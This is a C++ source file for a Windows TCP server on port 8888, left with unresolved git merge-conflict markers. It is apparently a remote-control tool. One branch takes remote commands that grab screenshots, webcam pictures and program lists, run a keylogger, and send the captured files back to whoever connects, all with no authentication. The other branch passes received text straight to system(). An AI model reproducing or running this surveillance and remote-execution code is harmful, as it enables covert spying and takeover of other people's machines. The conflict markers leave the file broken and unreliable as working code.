<<<<<<< Updated upstream
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#pragma comment(lib, "ws2_32.lib")

using namespace std;
=======
#include "../Application/lib.h"
#include "../Application/executeCommand.h"
#include <iostream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <map>
#include <functional>

#pragma comment(lib, "ws2_32.lib")

const std::string saveDir = "C:/MMT/";

// helper trim
static std::string trim(const std::string &s) {
  size_t a = s.find_first_not_of(" \r\n\t");
  if (a == std::string::npos) return "";
  size_t b = s.find_last_not_of(" \r\n\t");
  return s.substr(a, b - a + 1);
}

// Helper function to send all data reliably
bool send_all(SOCKET sock, const char *data, size_t size) {
  size_t sent = 0;
  while (sent < size) {
    int result = send(sock, data + sent, static_cast<int>(size - sent), 0);
    if (result == SOCKET_ERROR || result == 0) {
      std::cerr << "[Server] Send failed with error: " << WSAGetLastError()
                << "\n";
      return false;
    }
    sent += result;
  }
  return true;
}

// map command -> handler that fills outFile
std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
    {"get_screenshot",
     [](std::string &outFile) {
       outFile = saveDir + "screenshot.png";
       take_screenshot(outFile);
     }},
    {"get_picture",
     [](std::string &outFile) {
       outFile = saveDir + "picture.png";
       take_picture(outFile);
     }},
    {"list_program",
     [](std::string &outFile) {
       outFile = saveDir + "programs.txt";
       list_programs_to_file(outFile);
     }},
    {"keylogger", [](std::string &outFile) {
       outFile = saveDir + "keylog.txt";
       run_keylogger_and_save(outFile, 10);
     }}};

void send_file_over_socket(SOCKET sock, const std::string &filename) {
  std::ifstream file(filename, std::ios::binary);
  if (!file) {
    size_t fileSize = 0;
    send_all(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize));
    std::cerr << "[Server] Cannot open file to send: " << filename << "\n";
    return;
  }

  file.seekg(0, std::ios::end);
  size_t fileSize = file.tellg();
  file.seekg(0, std::ios::beg);

  std::cout << "[Server] Sending file " << filename << " (size: " << fileSize
            << " bytes)\n";

  // Send file size first
  if (!send_all(sock, reinterpret_cast<const char *>(&fileSize),
                sizeof(fileSize))) {
    std::cerr << "[Server] Failed to send file size\n";
    return;
  }

  if (fileSize == 0) {
    std::cout << "[Server] File is empty\n";
    return;
  }

  // Send file content
  char buffer[4096];
  size_t sent = 0;

  while (file && sent < fileSize) {
    file.read(buffer, sizeof(buffer));
    std::streamsize chunk = file.gcount();

    if (chunk <= 0) break;

    if (!send_all(sock, buffer, static_cast<size_t>(chunk))) {
      std::cerr << "[Server] Failed to send file chunk at offset " << sent
                << "\n";
      return;
    }

    sent += chunk;
    std::cout << "[Server] Progress: " << sent << "/" << fileSize << " bytes\n";
  }

  if (sent == fileSize) {
    std::cout << "[Server] Successfully sent file " << filename << " (" << sent
              << " bytes)\n";
  } else {
    std::cerr << "[Server] File transfer incomplete. Sent " << sent << "/"
              << fileSize << " bytes\n";
  }
}
>>>>>>> Stashed changes

int main() {
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
<<<<<<< Updated upstream
    cerr << "[Server] WSAStartup error: " << WSAGetLastError() << endl;
    return 1;
  }

  int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (serverSocket == INVALID_SOCKET) {
    cerr << "[Server] Can not create socket: " << WSAGetLastError() << endl;
    WSACleanup();
    return 1;
  }

=======
    std::cerr << "[Server] WSAStartup failed: " << WSAGetLastError() << "\n";
    return 1;
  }

  SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (serverSocket == INVALID_SOCKET) {
    std::cerr << "[Server] Socket creation failed: " << WSAGetLastError()
              << "\n";
    WSACleanup();
    return 1;
  }

  // optional reuse
  int opt = 1;
  setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (const char *)&opt,
             sizeof(opt));

>>>>>>> Stashed changes
  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  serverAddr.sin_addr.s_addr = INADDR_ANY;

<<<<<<< Updated upstream
  if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    cerr << "[Server] Bind error: " << WSAGetLastError() << endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
=======
  if (bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cerr << "[Server] Bind failed: " << WSAGetLastError() << "\n";
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  if (listen(serverSocket, 5) == SOCKET_ERROR) {
    std::cerr << "[Server] Listen failed: " << WSAGetLastError() << "\n";
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  std::cout << "[Server] Listening on port 8888...\n";

  while (true) {
    sockaddr_in clientAddr{};
    int clientSize = sizeof(clientAddr);
    SOCKET clientSocket =
        accept(serverSocket, (sockaddr *)&clientAddr, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
      std::cerr << "[Server] Accept error: " << WSAGetLastError() << "\n";
      continue;
    }

    std::cout << "[Server] Client connected.\n";

    char buffer[4096] = {};
    int bytes = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytes <= 0) {
      std::cerr << "[Server] Receive failed or closed.\n";
      closesocket(clientSocket);
      continue;
    }

    buffer[bytes] = '\0';
    std::istringstream iss(buffer);
    std::string sender_email, command;
    std::getline(iss, sender_email);
    std::getline(iss, command);
    sender_email = trim(sender_email);
    command = trim(command);

    std::cout << "[Server] Command from " << sender_email << ": " << command
              << "\n";

    if (commandHandlers.count(command)) {
      std::string outFile;
      commandHandlers[command](outFile);
      send_file_over_socket(clientSocket, outFile);
    } else {
      execute_command_with_sender(sender_email, command);
    }

    closesocket(clientSocket);
    std::cout << "[Server] Connection closed.\n";
>>>>>>> Stashed changes
  }

  listen(serverSocket, 5);
  cout << "[Server] Waiting for server connection at port 8888...\n";

  sockaddr_in clientAddr{};
  int clientSize = sizeof(clientAddr);
  int clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
  if (clientSocket == INVALID_SOCKET) {
    cerr << "[Server] Accept error: " << WSAGetLastError() << endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  cout << "[Server] Connected to client.\n";

  while (true) {
    char buffer[1024] = {};
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesReceived <= 0) {
      cout << "[Server] Client disconnected.\n";
      break;
    }

    buffer[bytesReceived] = '\0';  
    cout << "[Server] Receive Command: " << buffer << endl;

    if (strcmp(buffer, "shutdown") == 0) {
      send(clientSocket, "shutdown command (virtual)", 25, 0);
    } else if (strncmp(buffer, "start_program ", 14) == 0) {
      string cmd = buffer + 14;
      system(cmd.c_str());
      send(clientSocket, "Finished", 27, 0);
    } else {
      send(clientSocket, "Undefined command", 21, 0);
    }
  }

  closesocket(clientSocket);
  closesocket(serverSocket);
  WSACleanup();

  return 0;
}